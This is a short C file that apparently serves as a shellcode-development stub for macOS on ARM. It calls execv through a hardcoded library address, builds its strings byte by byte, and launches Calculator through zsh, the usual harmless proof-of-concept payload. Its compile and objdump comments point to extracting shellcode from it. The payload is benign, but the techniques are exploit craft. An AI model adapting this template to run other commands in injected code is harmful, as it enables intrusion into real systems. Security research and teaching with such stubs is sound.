// clang -fno-pie -shared -fno-stack-protector -o execve20_arm execve20_arm.c
// objdump -d --print-imm-hex execve20_arm
int main(void)
{
    typedef int *(*execv_t)(const char *, char *const *);
    execv_t my_execv = (execv_t)0x18a5f3c68;
    char cmd[9];
    cmd[0] = '/';
    cmd[1] = 'b';
    cmd[2] = 'i';
    cmd[3] = 'n';
    cmd[4] = '/';
    cmd[5] = 'z';
    cmd[6] = 's';
    cmd[7] = 'h';
    cmd[8] = 0;

    char arg1[3];
    arg1[0] = '-';
    arg1[1] = 'c';
    arg1[2] = 0;

    char arg2[41];
    arg2[0] = 'o';
    arg2[1] = 'p';
    arg2[2] = 'e';
    arg2[3] = 'n';
    arg2[4] = ' ';
    arg2[5] = '/';
    arg2[6] = 'S';
    arg2[7] = 'y';
    arg2[8] = 's';
    arg2[9] = 't';
    arg2[10] = 'e';
    arg2[11] = 'm';
    arg2[12] = '/';
    arg2[13] = 'A';
    arg2[14] = 'p';
    arg2[15] = 'p';
    arg2[16] = 'l';
    arg2[17] = 'i';
    arg2[18] = 'c';
    arg2[19] = 'a';
    arg2[20] = 't';
    arg2[21] = 'i';
    arg2[22] = 'o';
    arg2[23] = 'n';
    arg2[24] = 's';
    arg2[25] = '/';
    arg2[26] = 'C';
    arg2[27] = 'a';
    arg2[28] = 'l';
    arg2[29] = 'c';
    arg2[30] = 'u';
    arg2[31] = 'l';
    arg2[32] = 'a';
    arg2[33] = 't';
    arg2[34] = 'o';
    arg2[35] = 'r';
    arg2[36] = '.';
    arg2[37] = 'a';
    arg2[38] = 'p';
    arg2[39] = 'p';
    arg2[40] = 0;

    char *cmds[] = {cmd, arg1, arg2, 0};
    my_execv(cmds[0], cmds);
    return 0;
}